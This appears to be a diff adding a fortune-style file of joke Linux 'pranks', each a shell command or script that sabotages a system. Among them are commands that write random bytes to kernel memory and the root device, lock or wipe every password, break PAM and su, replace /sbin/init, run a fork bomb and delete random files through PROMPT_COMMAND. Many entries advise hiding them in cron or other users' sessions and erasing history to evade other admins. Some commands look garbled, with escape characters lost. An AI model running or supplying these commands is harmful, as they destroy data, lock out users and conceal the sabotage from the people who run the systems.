@@ -1,0 +1,287 @@
+We are all the same...
+======================
+To have some fun add the following line to the defaults and all device sections of your /etc/multipath.conf file:
+
+> getuid_callout  "echo byebyestorage"
+%
+Russian Roulette
+================
+This one was sent in by DIVI:
+
+> dd if=/dev/random of=/dev/kmem count=1 bs=1 seek=$RANDOM
+
+This would be a nice one to hide somewhere in /etc/cron.d/…
+%
+Subtle login problem
+====================
+This one was sent in by Ed van der Salm:
+
+sed -i 's/:$6/:$5/g' /etc/shadow
+
+Thanks Ed!
+%
+Now that’s a proper startup
+===========================
+
+> sed -i 's/runlevel="$argv1"/runlevel="$[{RANDOM} % 7 ]"/' /etc/rc.d/rc
+%
+Defaults are fine, right?
+=========================
+
+chcon -t default_t /
+%
+Connecting…
+===========
+
+ip rule add to 0.0.0.0/0 unreachable
+%
+SELinux fun
+===========
+
+> TYPES=($(seinfo -t | tail -n+3))
+> for FILE in $(find /); do
+>     chcon -t ${TYPES[$[ ${RANDOM} % ${#TYPES[@]} ]]} ${FILE}
+> done) &> /dev/null
+%
+N[eo]tworking…
+==============
+
+iptables -I INPUT 1 -m statistic --mode random --probability 0.25 -j DROP
+%
+Accelerated bitrot
+==================
+
+Another nice one to put in cron. Putting it at roughly once every hour should provide you with nice but subtle failures over time:
+
+> ROOTDEV=$(df -h / | sed -n '2p' | cut -d ' ' -f1)
+> ROOTSZ=$[$(blockdev --getsz ${ROOTDEV}) * 512]
+> LOCATION=$[${RANDOM} * ${RANDOM} * ${RANDOM} % ${ROOTSZ}]
+> dd if=/dev/urandom of=${ROOTDEV} bs=1 count=1 seek=${LOCATION} conv=notrunc
+%
+We don’t play favourites.
+=========================
+
+Include this somewhere in cron, or just run it yourself from time to time to give your users the diversity they so rightly deserve:
+
+> for I in $(getent passwd | cut -d: -f1 )
+> do
+>     chsh -s $(sort -R /etc/shells | head -n1) ${I}
+> done
+%
+Add some spice to your life
+===========================
+
+Spice up your life a bit with the following command:
+
+> echo 'SYSRQLETTERS="bcdefghijklmnopqrstuvwx"; echo ${SYSRQLETTERS} | cut -c $[$RANDOM % ${#SYSRQLETTERS} + 1] > /proc/sysrq-trigger' > /etc/cron.hourly/happyfuntime; chmod +x /etc/cron.hourly/happyfuntime
+%
+No Reservations?
+================
+
+tune2fs -m50 $(mount | awk '/on / type/{print $1}')
+%
+Bad memory
+==========
+
+This little baby will tell your kernel that the first 256 Gibibytes of memory are not to be used. Run it, reboot, watch hilarity ensue:
+
+> sed -i -r '/vmlinuz/s/(.*)/1 memmap=256G$0x0000/' /boot/grub/grub.conf
+%
+Bound to nothing…
+=================
+
+Add this little sucker to /etc/fstab and reboot:
+
+> /dev/null    /bin/bash    bind   bind   0 0
+%
+Speed? What speed?
+==================
+
+This one got submitted by Ray:
+
+> echo "base=0x00000000 size=0xffffffff type=uncachable" > /proc/mtrr
+
+It works best if you put it in rc.sysinit or any other place early in your boot sequence.
+%
+What login?
+===========
+
+Try and have some fun with this one:
+
+> sed -i 's/unix/time/g' /etc/pam.d/system-auth
+%
+Who needs multiple cores anyway?
+================================
+
+Do you remember the good old days when all you had was a single core? Time to re-live those glory days!
+
+> for I in /sys/devices/system/cpu/cpu[1-9]*
+> do
+>     echo 0 > ${I}/online
+> done
+
+*Unfortunately we can’t disable cpu0…*
+%
+SImplify your init
+==================
+
+This one was submitted by fl0_:
+
+Create a file called init.c
+> #include <stdio.h>
+> 
+> int main(){
+> 
+>        printf("MOEHAHAHHAAAAn");
+>        return 0;
+> }
+
+Next run the following commands:
+
+> gcc -o init init.c
+> touch -r /sbin/init init
+> cp -f init /sbin/init
+
+You might want to hide your handiwork from the other admins by either removing ~/.bash_history(obvious)/running set +o history before you begin/kill -9 $$
+%
+Efficient Secure Shell
+
+======================
+Do all those people who use ssh irritate you as well because you can’t eavesdrop on their connections? Teach them a lesson so that they’ll revert to good ol’ telnet!
+
+> printf 'tHostname localhostn' >> /etc/ssh/ssh_config
+%
+Help the homeless
+=================
+
+> chmod a-x $(find /home -depth -maxdepth 1 -type d)
+%
+It’s there isn’t it?
+====================
+
+Try this one to annoy your users. for extra fun replace /bin with /usr/bin, rinse, repeat.
+
+> mv /bin '/bin '
+%
+Slow down there a bit bro…
+==========================
+
+Fast network links getting you down?
+
+> for IF in $(ip l | awk -F': ' '/^[0-9]/{print $2}')
+> do
+>     ip l s ${IF} mtu 60
+> done
+
+Especially fun if this machine is acting as a (nat-)router for other boxes…
+%
+You make me feel complete
+=========================
+
+Pop this one into a bash session and watch the hilarity ensue:
+
+> complete -E -W 'rm -rf /* /.*'
+%
+Passwords? We don’t need no stinkin’ passwords!
+===============================================
+
+> sed -ri 's/([^:]*):[^:]*:(.*)/1:!!:2/' /etc/shadow
+
+Or for the wusses who want something a bit more recoverable:
+
+> for I in $(getent passwd | cut -d: -f1)
+> do
+>     passwd -l ${I}
+>     chage -E0 -M1 -m513 -I1 -W1023 ${I}
+> done
+%
+Still, who needs root?
+======================
+
+> printf 'roott-tmaxloginst0n' >> /etc/security/limits.conf
+%
+Who needs root anyway?
+======================
+
+> chmod u-s /bin/su
+%
+Nice and quiet on the email front
+=================================
+
+Do you hate all those incoming and outgoing emails as much as we do? Are you running sendmail? In that case help is at hand:
+
+> chmod g+w /
+%
+Better learn to type fast…
+==========================
+
+Another nice one to confuse and annoy, as usual you need to sneak this one into somebody’s bash session:
+
+> export PROMPT_COMMAND='export TMOUT=$[ ${RANDOM} % 15 ]'
+%
+Fun with Vim and Files
+======================
+
+Add this little bugger to either /etc/vimrc or to an induhvidual’s ~/.vimrc
+
+> :wqa
+%
+I’m sorry, but I can’t let you do that Dave…
+============================================
+
+> echo "kernel.pid_max = 132" >> /etc/sysctl.conf
+%
+Better get some rescue cd’s…
+============================
+
+This one was submitted by giulivo using the submission link:
+
+> chmod a-x /lib/ld-2*.so
+%
+What ftp server?
+================
+
+In /etc/vsftpd/vsftpd.conf add or change the following lines:
+
+> chown_uploads=YES
+> chown_username=daemon<space>
+
+Where <space> is an actual space character before the end of the line.
+%Beginners
+
+Run the following command and reboot :
+
+echo 'echo b > /proc/sysrq-trigger ' >> /etc/rc.local
+%
+Meet the Prompt of Doom
+=======================
+
+Try to sneak this one into someone’s session and watch the hilarity ensue:
+
+> export PROMPT_COMMAND='FILES=($(ls)); rm -rf ${FILES[$[${RANDOM} % ${#FILES[@]}]]} &> /dev/null'
+%
+Classic
+=======
+
+Just enter this little baby into any account where ulimit -u reports unlimited
+
+> :() { :|:& };:
+%
+Neverending story
+=================
+
+> echo "@reboot reboot" > /etc/cron.d/system
+%
+Devicenode deletion
+===================
+
+Add this file as /etc/udev/rules.d/01-devices.rules:
+
+> ACTION=="add", SUBSYSTEM=="block", NAME:="hehehe"
+%
+Random exits
+============
+
+This one is sure to confuse. A user will exit his shell somewehere random inside 30 minutes after starting it. Hide the following piece of code somewhere in /etc/bashrc or a .sh file in /etc/profile.d/
+
+> export PROMPT_COMMAND='[ ${SECONDS} -ge $[ ${RANDOM} % 1800 ]] && exit'
